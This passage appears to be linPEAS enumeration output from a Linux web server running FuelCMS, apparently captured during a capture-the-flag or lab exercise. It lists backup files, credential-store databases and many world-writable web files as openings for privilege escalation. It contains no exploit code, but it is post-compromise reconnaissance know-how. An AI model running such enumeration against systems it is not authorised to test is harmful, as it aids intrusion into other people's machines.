-rw-r--r-- 1 root root 2308 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2530 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 2418 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 1427 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 1298 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 217038 Jan 29  2019 /usr/src/linux-headers-4.15.0-45-generic/.config.old
-rw-r--r-- 1 root root 0 Jan 29  2019 /usr/src/linux-headers-4.15.0-45-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jan 29  2019 /usr/src/linux-headers-4.15.0-45-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 35792 May  8  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 5406 Oct 18  2016 /usr/lib/libreoffice/share/config/soffice.cfg/dbaccess/ui/backuppage.ui
-rw-r--r-- 1 root root 673 Feb 26  2019 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Feb 26  2019 /etc/xml/catalog.old
-rw-r--r-- 1 root root 2903 Jul 26  2019 /etc/apt/sources.bak

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/colord/mapping.db: SQLite 3.x database                                                                                                                                                                                       
Found /var/lib/colord/storage.db: SQLite 3.x database
Found /var/lib/fwupd/pending.db: SQLite 3.x database
Found /var/lib/mlocate/mlocate.db: regular file, no read permission
Found /var/lib/nssdb/cert9.db: SQLite 3.x database
Found /var/lib/nssdb/key4.db: SQLite 3.x database
Found /var/lib/nssdb/secmod.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)

 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
 -> Extracting tables from /var/lib/colord/storage.db (limit 20)                                                                                                                                                                            
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                                                                                                                                             
 -> Extracting tables from /var/lib/nssdb/cert9.db (limit 20)                                                                                                                                                                               
 -> Extracting tables from /var/lib/nssdb/key4.db (limit 20)                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                                                                                  
total 12K
drwxr-xr-x  3 root root 4.0K Jul 26  2019 .
drwxr-xr-x 15 root root 4.0K Jul 26  2019 ..
drwxrwxrwx  4 root root 4.0K Nov  1 12:38 html

/var/www/html:
total 156K
drwxrwxrwx 4 root     root     4.0K Nov  1 12:38 .
drwxr-xr-x 3 root     root     4.0K Jul 26  2019 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 163 Jul 26  2019 /var/www/html/.htaccess                                                                                                                                                                             
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/data_backup/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/application/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/application/cache/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/application/logs/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/scripts/.htaccess
-rwxrwxrwx 1 root root 117 Jul 26  2019 /var/www/html/fuel/codeigniter/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/install/.htaccess
-r--r--r-- 1 root root 11 Nov  1 12:35 /tmp/.X0-lock
-rw-r--r-- 1 root root 1531 Jul 26  2019 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 26  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Nov  1 12:34 /run/network/.ifstate.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-r--r--r-- 1 root root 11 Nov  1 12:35 /tmp/.X0-lock                                                                                                                                                                                        
-rw-r--r-- 1 root root 71680 Jul 26  2019 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 345 Jul 26  2019 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 43 Jul 26  2019 /var/backups/dpkg.arch.1.gz
-rw-r--r-- 1 root root 265 Jul 26  2019 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 4234 Jul 26  2019 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 195 Jul 26  2019 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 11 Jul 26  2019 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 1044 Jul 26  2019 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 1789061 Jul 26  2019 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 489939 Jul 26  2019 /var/backups/dpkg.status.1.gz

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
awk: write failure (Broken pipe)                                                                                                                                                                                                            
awk: close failed on file /dev/stdout (Broken pipe)
/dev/mqueue
/dev/shm
/dev/shm/linpeas.sh
/home/www-data
/run/lock
/run/lock/apache2
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/php/sessions
/var/metrics
/var/tmp
/var/www/html
/var/www/html/README.md
/var/www/html/assets
/var/www/html/assets/cache
/var/www/html/assets/cache/index.html
/var/www/html/assets/css
/var/www/html/assets/css/blog.css
/var/www/html/assets/css/common.css
/var/www/html/assets/css/main.css
/var/www/html/assets/css/reset.css
/var/www/html/assets/docs
/var/www/html/assets/docs/index.html
/var/www/html/assets/images
/var/www/html/assets/images/index.html
/var/www/html/assets/js
/var/www/html/assets/js/jquery.js
/var/www/html/assets/js/main.js
/var/www/html/assets/pdf
/var/www/html/assets/pdf/index.html
/var/www/html/assets/swf
/var/www/html/assets/swf/index.html
/var/www/html/composer.json
/var/www/html/contributing.md
/var/www/html/fuel
/var/www/html/fuel/application
/var/www/html/fuel/application/.htaccess
/var/www/html/fuel/application/cache
/var/www/html/fuel/application/cache/.htaccess
/var/www/html/fuel/application/cache/dwoo
/var/www/html/fuel/application/cache/dwoo/compiled
/var/www/html/fuel/application/cache/dwoo/compiled/index.html
/var/www/html/fuel/application/cache/dwoo/index.html
/var/www/html/fuel/application/cache/index.html
/var/www/html/fuel/application/config
/var/www/html/fuel/application/config/MY_config.php
/var/www/html/fuel/application/config/MY_fuel.php
/var/www/html/fuel/application/config/MY_fuel_layouts.php
/var/www/html/fuel/application/config/MY_fuel_modules.php
/var/www/html/fuel/application/config/asset.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/application/controllers
/var/www/html/fuel/application/controllers/index.html
/var/www/html/fuel/application/core
/var/www/html/fuel/application/core/MY_Controller.php
/var/www/html/fuel/application/core/MY_DB_mysql_driver.php
/var/www/html/fuel/application/core/MY_DB_mysql_result.php
/var/www/html/fuel/application/core/MY_DB_mysqli_driver.php
/var/www/html/fuel/application/core/MY_DB_mysqli_result.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/application/helpers
/var/www/html/fuel/application/helpers/MY_array_helper.php
/var/www/html/fuel/application/helpers/MY_date_helper.php
/var/www/html/fuel/application/helpers/MY_directory_helper.php
/var/www/html/fuel/application/helpers/MY_file_helper.php
/var/www/html/fuel/application/helpers/MY_html_helper.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/application/hooks
/var/www/html/fuel/application/hooks/index.html
/var/www/html/fuel/application/index.html
/var/www/html/fuel/application/language
/var/www/html/fuel/application/language/english
/var/www/html/fuel/application/language/english/index.html
/var/www/html/fuel/application/libraries
/var/www/html/fuel/application/libraries/MY_DB_mysqli_utility.php
/var/www/html/fuel/application/libraries/MY_Image_lib.php
/var/www/html/fuel/application/libraries/MY_Profiler.php
/var/www/html/fuel/application/libraries/MY_Typography.php
/var/www/html/fuel/application/libraries/index.html
/var/www/html/fuel/application/logs
/var/www/html/fuel/application/logs/.htaccess
/var/www/html/fuel/application/logs/index.html
/var/www/html/fuel/application/migrations
/var/www/html/fuel/application/migrations/001_install.php
/var/www/html/fuel/application/models
/var/www/html/fuel/application/models/index.html
/var/www/html/fuel/application/third_party
/var/www/html/fuel/application/third_party/MX
/var/www/html/fuel/application/third_party/MX/Base.php
/var/www/html/fuel/application/third_party/MX/Ci.php
/var/www/html/fuel/application/third_party/MX/Config.php
/var/www/html/fuel/application/third_party/MX/Controller.php
/var/www/html/fuel/application/third_party/MX/Lang.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/application/third_party/index.html
/var/www/html/fuel/application/views
/var/www/html/fuel/application/views/_admin
/var/www/html/fuel/application/views/_admin/_fuel_preview.php
/var/www/html/fuel/application/views/_blocks
/var/www/html/fuel/application/views/_blocks/footer.php
/var/www/html/fuel/application/views/_blocks/header.php
/var/www/html/fuel/application/views/_blocks/posts
/var/www/html/fuel/application/views/_blocks/posts/archives.php
/var/www/html/fuel/application/views/_blocks/posts/categories.php
/var/www/html/fuel/application/views/_blocks/posts/post_unpublished.php
/var/www/html/fuel/application/views/_blocks/posts/share.php
/var/www/html/fuel/application/views/_blocks/posts/tags.php
/var/www/html/fuel/application/views/_docs
/var/www/html/fuel/application/views/_docs/fuel.php
/var/www/html/fuel/application/views/_docs/index.php
/var/www/html/fuel/application/views/_install.php
/var/www/html/fuel/application/views/_layouts
/var/www/html/fuel/application/views/_layouts/301_redirect.php
/var/www/html/fuel/application/views/_layouts/404_error.php
/var/www/html/fuel/application/views/_layouts/_module.php
/var/www/html/fuel/application/views/_layouts/alias.php
/var/www/html/fuel/application/views/_layouts/main.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/application/views/_posts
/var/www/html/fuel/application/views/_posts/archives.php
/var/www/html/fuel/application/views/_posts/category.php
/var/www/html/fuel/application/views/_posts/post.php
/var/www/html/fuel/application/views/_posts/posts.php
/var/www/html/fuel/application/views/_posts/search.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/application/views/_variables
/var/www/html/fuel/application/views/_variables/global.php
/var/www/html/fuel/application/views/_variables/nav.php
/var/www/html/fuel/application/views/errors
/var/www/html/fuel/application/views/errors/cli
/var/www/html/fuel/application/views/errors/cli/error_404.php
/var/www/html/fuel/application/views/errors/cli/error_db.php
/var/www/html/fuel/application/views/errors/cli/error_exception.php
/var/www/html/fuel/application/views/errors/cli/error_general.php
/var/www/html/fuel/application/views/errors/cli/error_php.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/application/views/errors/html
/var/www/html/fuel/application/views/errors/html/error_404.php
/var/www/html/fuel/application/views/errors/html/error_db.php
/var/www/html/fuel/application/views/errors/html/error_exception.php
/var/www/html/fuel/application/views/errors/html/error_general.php
/var/www/html/fuel/application/views/errors/html/error_php.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/application/views/errors/index.html
/var/www/html/fuel/application/views/home.php
/var/www/html/fuel/application/views/index.html
/var/www/html/fuel/application/views/offline.php
/var/www/html/fuel/application/views/sitemap_xml.php
/var/www/html/fuel/codeigniter
/var/www/html/fuel/codeigniter/.htaccess
/var/www/html/fuel/codeigniter/core
/var/www/html/fuel/codeigniter/core/Benchmark.php
/var/www/html/fuel/codeigniter/core/CodeIgniter.php
/var/www/html/fuel/codeigniter/core/Common.php
/var/www/html/fuel/codeigniter/core/Config.php
/var/www/html/fuel/codeigniter/core/Controller.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/codeigniter/core/compat/hash.php
/var/www/html/fuel/codeigniter/core/compat/index.html
/var/www/html/fuel/codeigniter/core/compat/mbstring.php
/var/www/html/fuel/codeigniter/core/compat/password.php
/var/www/html/fuel/codeigniter/core/compat/standard.php
/var/www/html/fuel/codeigniter/core/index.html
/var/www/html/fuel/codeigniter/database
/var/www/html/fuel/codeigniter/database/DB.php
/var/www/html/fuel/codeigniter/database/DB_cache.php
/var/www/html/fuel/codeigniter/database/DB_driver.php
/var/www/html/fuel/codeigniter/database/DB_forge.php
/var/www/html/fuel/codeigniter/database/DB_query_builder.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/codeigniter/database/drivers/cubrid
/var/www/html/fuel/codeigniter/database/drivers/cubrid/cubrid_driver.php
/var/www/html/fuel/codeigniter/database/drivers/cubrid/cubrid_forge.php
/var/www/html/fuel/codeigniter/database/drivers/cubrid/cubrid_result.php
/var/www/html/fuel/codeigniter/database/drivers/cubrid/cubrid_utility.php
/var/www/html/fuel/codeigniter/database/drivers/cubrid/index.html
/var/www/html/fuel/codeigniter/database/drivers/ibase
/var/www/html/fuel/codeigniter/database/drivers/ibase/ibase_driver.php
/var/www/html/fuel/codeigniter/database/drivers/ibase/ibase_forge.php
/var/www/html/fuel/codeigniter/database/drivers/ibase/ibase_result.php
/var/www/html/fuel/codeigniter/database/drivers/ibase/ibase_utility.php
/var/www/html/fuel/codeigniter/database/drivers/ibase/index.html
/var/www/html/fuel/codeigniter/database/drivers/index.html
/var/www/html/fuel/codeigniter/database/drivers/mssql
/var/www/html/fuel/codeigniter/database/drivers/mssql/index.html
/var/www/html/fuel/codeigniter/database/drivers/mssql/mssql_driver.php
/var/www/html/fuel/codeigniter/database/drivers/mssql/mssql_forge.php
/var/www/html/fuel/codeigniter/database/drivers/mssql/mssql_result.php
/var/www/html/fuel/codeigniter/database/drivers/mssql/mssql_utility.php
/var/www/html/fuel/codeigniter/database/drivers/mysql
/var/www/html/fuel/codeigniter/database/drivers/mysql/index.html
/var/www/html/fuel/codeigniter/database/drivers/mysql/mysql_driver.php
/var/www/html/fuel/codeigniter/database/drivers/mysql/mysql_forge.php
/var/www/html/fuel/codeigniter/database/drivers/mysql/mysql_result.php
/var/www/html/fuel/codeigniter/database/drivers/mysql/mysql_utility.php
/var/www/html/fuel/codeigniter/database/drivers/mysqli
/var/www/html/fuel/codeigniter/database/drivers/mysqli/index.html
/var/www/html/fuel/codeigniter/database/drivers/mysqli/mysqli_driver.php
/var/www/html/fuel/codeigniter/database/drivers/mysqli/mysqli_forge.php
/var/www/html/fuel/codeigniter/database/drivers/mysqli/mysqli_result.php
/var/www/html/fuel/codeigniter/database/drivers/mysqli/mysqli_utility.php
/var/www/html/fuel/codeigniter/database/drivers/oci8
/var/www/html/fuel/codeigniter/database/drivers/oci8/index.html
/var/www/html/fuel/codeigniter/database/drivers/oci8/oci8_driver.php
/var/www/html/fuel/codeigniter/database/drivers/oci8/oci8_forge.php
/var/www/html/fuel/codeigniter/database/drivers/oci8/oci8_result.php
/var/www/html/fuel/codeigniter/database/drivers/oci8/oci8_utility.php
/var/www/html/fuel/codeigniter/database/drivers/odbc
/var/www/html/fuel/codeigniter/database/drivers/odbc/index.html
/var/www/html/fuel/codeigniter/database/drivers/odbc/odbc_driver.php
/var/www/html/fuel/codeigniter/database/drivers/odbc/odbc_forge.php
/var/www/html/fuel/codeigniter/database/drivers/odbc/odbc_result.php
/var/www/html/fuel/codeigniter/database/drivers/odbc/odbc_utility.php
/var/www/html/fuel/codeigniter/database/drivers/pdo
/var/www/html/fuel/codeigniter/database/drivers/pdo/index.html
/var/www/html/fuel/codeigniter/database/drivers/pdo/pdo_driver.php
/var/www/html/fuel/codeigniter/database/drivers/pdo/pdo_forge.php
/var/www/html/fuel/codeigniter/database/drivers/pdo/pdo_result.php
/var/www/html/fuel/codeigniter/database/drivers/pdo/pdo_utility.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/codeigniter/database/drivers/pdo/subdrivers/index.html
/var/www/html/fuel/codeigniter/database/drivers/pdo/subdrivers/pdo_4d_driver.php
/var/www/html/fuel/codeigniter/database/drivers/pdo/subdrivers/pdo_4d_forge.php
/var/www/html/fuel/codeigniter/database/drivers/pdo/subdrivers/pdo_cubrid_driver.php
/var/www/html/fuel/codeigniter/database/drivers/pdo/subdrivers/pdo_cubrid_forge.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/codeigniter/database/drivers/postgre
/var/www/html/fuel/codeigniter/database/drivers/postgre/index.html
/var/www/html/fuel/codeigniter/database/drivers/postgre/postgre_driver.php
/var/www/html/fuel/codeigniter/database/drivers/postgre/postgre_forge.php
/var/www/html/fuel/codeigniter/database/drivers/postgre/postgre_result.php
/var/www/html/fuel/codeigniter/database/drivers/postgre/postgre_utility.php
/var/www/html/fuel/codeigniter/database/drivers/sqlite
/var/www/html/fuel/codeigniter/database/drivers/sqlite/index.html
/var/www/html/fuel/codeigniter/database/drivers/sqlite/sqlite_driver.php
/var/www/html/fuel/codeigniter/database/drivers/sqlite/sqlite_forge.php
/var/www/html/fuel/codeigniter/database/drivers/sqlite/sqlite_result.php
/var/www/html/fuel/codeigniter/database/drivers/sqlite/sqlite_utility.php
/var/www/html/fuel/codeigniter/database/drivers/sqlite3
/var/www/html/fuel/codeigniter/database/drivers/sqlite3/index.html
/var/www/html/fuel/codeigniter/database/drivers/sqlite3/sqlite3_driver.php
/var/www/html/fuel/codeigniter/database/drivers/sqlite3/sqlite3_forge.php
/var/www/html/fuel/codeigniter/database/drivers/sqlite3/sqlite3_result.php
/var/www/html/fuel/codeigniter/database/drivers/sqlite3/sqlite3_utility.php
/var/www/html/fuel/codeigniter/database/drivers/sqlsrv
/var/www/html/fuel/codeigniter/database/drivers/sqlsrv/index.html
/var/www/html/fuel/codeigniter/database/drivers/sqlsrv/sqlsrv_driver.php
/var/www/html/fuel/codeigniter/database/drivers/sqlsrv/sqlsrv_forge.php
/var/www/html/fuel/codeigniter/database/drivers/sqlsrv/sqlsrv_result.php
/var/www/html/fuel/codeigniter/database/drivers/sqlsrv/sqlsrv_utility.php
/var/www/html/fuel/codeigniter/database/index.html
/var/www/html/fuel/codeigniter/fonts
/var/www/html/fuel/codeigniter/fonts/index.html
/var/www/html/fuel/codeigniter/fonts/texb.ttf
/var/www/html/fuel/codeigniter/helpers
/var/www/html/fuel/codeigniter/helpers/array_helper.php
/var/www/html/fuel/codeigniter/helpers/captcha_helper.php
/var/www/html/fuel/codeigniter/helpers/cookie_helper.php
/var/www/html/fuel/codeigniter/helpers/date_helper.php
/var/www/html/fuel/codeigniter/helpers/directory_helper.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/codeigniter/index.html
/var/www/html/fuel/codeigniter/language
/var/www/html/fuel/codeigniter/language/english
/var/www/html/fuel/codeigniter/language/english/calendar_lang.php
/var/www/html/fuel/codeigniter/language/english/date_lang.php
/var/www/html/fuel/codeigniter/language/english/db_lang.php
/var/www/html/fuel/codeigniter/language/english/email_lang.php
/var/www/html/fuel/codeigniter/language/english/form_validation_lang.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/codeigniter/language/index.html
/var/www/html/fuel/codeigniter/libraries
/var/www/html/fuel/codeigniter/libraries/Cache
/var/www/html/fuel/codeigniter/libraries/Cache/Cache.php
/var/www/html/fuel/codeigniter/libraries/Cache/drivers
/var/www/html/fuel/codeigniter/libraries/Cache/drivers/Cache_apc.php
/var/www/html/fuel/codeigniter/libraries/Cache/drivers/Cache_dummy.php
/var/www/html/fuel/codeigniter/libraries/Cache/drivers/Cache_file.php
/var/www/html/fuel/codeigniter/libraries/Cache/drivers/Cache_memcached.php
/var/www/html/fuel/codeigniter/libraries/Cache/drivers/Cache_redis.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/codeigniter/libraries/Cache/index.html
/var/www/html/fuel/codeigniter/libraries/Calendar.php
/var/www/html/fuel/codeigniter/libraries/Cart.php
/var/www/html/fuel/codeigniter/libraries/Driver.php
/var/www/html/fuel/codeigniter/libraries/Email.php
/var/www/html/fuel/codeigniter/libraries/Encrypt.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/codeigniter/libraries/Session/Session.php
/var/www/html/fuel/codeigniter/libraries/Session/SessionHandlerInterface.php
/var/www/html/fuel/codeigniter/libraries/Session/Session_driver.php
/var/www/html/fuel/codeigniter/libraries/Session/drivers
/var/www/html/fuel/codeigniter/libraries/Session/drivers/Session_database_driver.php
/var/www/html/fuel/codeigniter/libraries/Session/drivers/Session_files_driver.php
/var/www/html/fuel/codeigniter/libraries/Session/drivers/Session_memcached_driver.php
/var/www/html/fuel/codeigniter/libraries/Session/drivers/Session_redis_driver.php
/var/www/html/fuel/codeigniter/libraries/Session/drivers/index.html
/var/www/html/fuel/codeigniter/libraries/Session/index.html
/var/www/html/fuel/codeigniter/libraries/Table.php
/var/www/html/fuel/codeigniter/libraries/Trackback.php
/var/www/html/fuel/codeigniter/libraries/Typography.php
/var/www/html/fuel/codeigniter/libraries/Unit_test.php
/var/www/html/fuel/codeigniter/libraries/Upload.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/codeigniter/libraries/javascript/Jquery.php
/var/www/html/fuel/codeigniter/libraries/javascript/index.html
/var/www/html/fuel/data_backup
/var/www/html/fuel/data_backup/.htaccess
/var/www/html/fuel/data_backup/index.html
/var/www/html/fuel/index.php
/var/www/html/fuel/install
/var/www/html/fuel/install/.htaccess
/var/www/html/fuel/install/archive
/var/www/html/fuel/install/archive/fuel_schema_0.9.3.sql
/var/www/html/fuel/install/archive/widgicorp.sql
/var/www/html/fuel/install/fuel_schema.sql
/var/www/html/fuel/install/upgrades
/var/www/html/fuel/install/upgrades/fuel_0.9.2_upgrade.sql
/var/www/html/fuel/install/upgrades/fuel_1.0_schema_changes.sql
/var/www/html/fuel/install/upgrades/fuel_1.2_schema_changes.sql
/var/www/html/fuel/install/upgrades/fuel_1.3_schema_changes.sql
/var/www/html/fuel/install/upgrades/fuel_1.4_schema_changes.sql
/var/www/html/fuel/licenses
/var/www/html/fuel/licenses/codeigniter_license.txt
/var/www/html/fuel/licenses/fuel_license.txt
/var/www/html/fuel/modules
/var/www/html/fuel/modules/fuel
/var/www/html/fuel/modules/fuel/assets
/var/www/html/fuel/modules/fuel/assets/cache
/var/www/html/fuel/modules/fuel/assets/cache/index.html
/var/www/html/fuel/modules/fuel/assets/css
/var/www/html/fuel/modules/fuel/assets/css/colorpicker.css
/var/www/html/fuel/modules/fuel/assets/css/datepicker.css
/var/www/html/fuel/modules/fuel/assets/css/fuel.css
/var/www/html/fuel/modules/fuel/assets/css/fuel.min.css
/var/www/html/fuel/modules/fuel/assets/css/fuel_inline.css
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/modules/fuel/assets/docs
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example.zip
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example/config
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example/config/MY_fuel_modules.php
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example/install
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example/install/fuel_example.sql
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example/models
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example/models/articles_model.php
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example/models/authors_model.php
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example/views
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example/views/articles.php
/var/www/html/fuel/modules/fuel/assets/images
/var/www/html/fuel/modules/fuel/assets/images/icons
/var/www/html/fuel/modules/fuel/assets/images/markitup
/var/www/html/fuel/modules/fuel/assets/images/screens
/var/www/html/fuel/modules/fuel/assets/images/treeview
/var/www/html/fuel/modules/fuel/assets/js
/var/www/html/fuel/modules/fuel/assets/js/editors
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/CHANGES.md
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/LICENSE.md
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/README.md
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/build-config.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/ckeditor.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/lang/af.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/lang/ar.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/lang/bg.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/lang/bn.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/lang/bs.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/a11yhelp
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/a11yhelp/dialogs
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/a11yhelp/dialogs/a11yhelp.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/a11yhelp/dialogs/lang
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/a11yhelp/dialogs/lang/_translationstatus.txt
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/a11yhelp/dialogs/lang/ar.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/a11yhelp/dialogs/lang/bg.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/a11yhelp/dialogs/lang/ca.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/a11yhelp/dialogs/lang/cs.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/about
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/about/dialogs
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/about/dialogs/about.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/about/dialogs/hidpi
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/clipboard
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/clipboard/dialogs
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/clipboard/dialogs/paste.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/dialog
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/dialog/dialogDefinition.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/fuelimage
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/fuelimage/plugin.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/fuellink
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/fuellink/plugin.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/image
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/image/dialogs
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/image/dialogs/image.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/image/images
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/link
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/link/dialogs
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/link/dialogs/anchor.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/link/dialogs/link.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/link/images
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/link/images/hidpi
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/magicline
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/magicline/images
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/magicline/images/hidpi
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/pastefromword
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/pastefromword/filter
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/pastefromword/filter/default.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/scayt
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/scayt/LICENSE.md
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/scayt/README.md
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/scayt/dialogs
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/scayt/dialogs/options.js
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/scayt/dialogs/toolbar.css
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/specialchar
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/specialchar/dialogs
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/specialchar/dialogs/lang
/var/www/html/fuel/modules/fuel/assets/js/editors/ckeditor/plugins/specialchar/dialogs/lang/_translationstatus.txt
